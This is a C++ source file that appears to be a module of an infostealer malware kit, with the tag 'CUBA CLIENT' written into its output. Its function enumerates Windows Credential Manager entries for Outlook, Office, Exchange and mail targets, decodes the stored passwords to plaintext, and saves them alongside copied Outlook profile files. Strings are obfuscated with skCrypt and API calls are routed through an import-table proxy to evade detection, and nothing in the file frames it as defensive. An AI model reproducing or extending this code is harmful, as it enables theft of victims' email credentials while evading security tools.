#include <misc_stealing/mail_clients.hpp>
#include <filesystem>
#include <string>
#include <algorithm>
#include <windows.h>
#include <wincred.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <obfuscation/iat_proxy.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

static std::string blob_to_utf8(LPBYTE data, DWORD size) {
    if (!data || size == 0) return "";
    //credentials blob is UTF-16LE
    if (size >= 2 && size % 2 == 0) {
        int chars = WideCharToMultiByte(CP_UTF8, 0,
            (LPCWSTR)data, (int)(size / sizeof(wchar_t)),
            nullptr, 0, nullptr, nullptr);
        if (chars > 0) {
            std::string result(chars, '\0');
            WideCharToMultiByte(CP_UTF8, 0,
                (LPCWSTR)data, (int)(size / sizeof(wchar_t)),
                result.data(), chars, nullptr, nullptr);
            bool printable = std::all_of(result.begin(), result.end(),
                [](unsigned char c) { return c >= 0x20 || c == '\n' || c == '\r' || c == '\t'; });
            if (printable) return result;
        }
    }
    return std::string(reinterpret_cast<char*>(data), size);
}

void steal_mail_clients() {
    //credential manager for outlook/office tokens
    //also fully untested, no clue if this works?
    {
        PCREDENTIALA* creds = nullptr;
        DWORD count = 0;

        if (iat::cred_enumerate_a(nullptr, 0, &count, &creds)) {
            std::string out;
            for (DWORD i = 0; i < count; i++) {
                std::string target = creds[i]->TargetName ? creds[i]->TargetName : "";
                std::string lower  = target;
                std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

                bool relevant =
                    lower.find(skCrypt("microsoftoffice")) != std::string::npos ||
                    lower.find(skCrypt("outlook"))         != std::string::npos ||
                    lower.find(skCrypt("exchange"))        != std::string::npos ||
                    lower.find(skCrypt("office"))          != std::string::npos ||
                    lower.find(skCrypt("live:"))           != std::string::npos ||
                    lower.find(skCrypt("mapi_"))           != std::string::npos ||
                    lower.find(skCrypt("mail"))            != std::string::npos;

                if (!relevant) continue;

                std::string user = creds[i]->UserName ? creds[i]->UserName : "";
                std::string pass = blob_to_utf8(creds[i]->CredentialBlob, creds[i]->CredentialBlobSize);

                out += skCrypt("Target: ") + target + "\n"
                     + skCrypt("User: ")   + user   + "\n"
                     + skCrypt("Pass: ")   + pass   + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            iat::cred_free(creds);
            if (!out.empty())
                mem_store::append(skCrypt("mail/outlook_credentials.txt"), out);
        }
    }

    //outlook profile files
    {
        fs::path outlook_dir = fs::path(features::get_home()) / skCrypt("AppData") / skCrypt("Roaming") / skCrypt("Microsoft") / skCrypt("Outlook");
        if (fs::exists(outlook_dir)) {
            try {
                for (const auto& entry : fs::directory_iterator(outlook_dir)) {
                    if (!entry.is_regular_file()) continue;
                    std::string ext = entry.path().extension().string();
                    if (ext == skCrypt(".xml") || ext == skCrypt(".srs") || ext == skCrypt(".nk2"))
                        mem_store::import_file(
                            skCrypt("mail/outlook_profiles/") + entry.path().filename().string(),
                            entry.path());
                }
            } catch (const std::exception&) {}
        }
    }
}

}
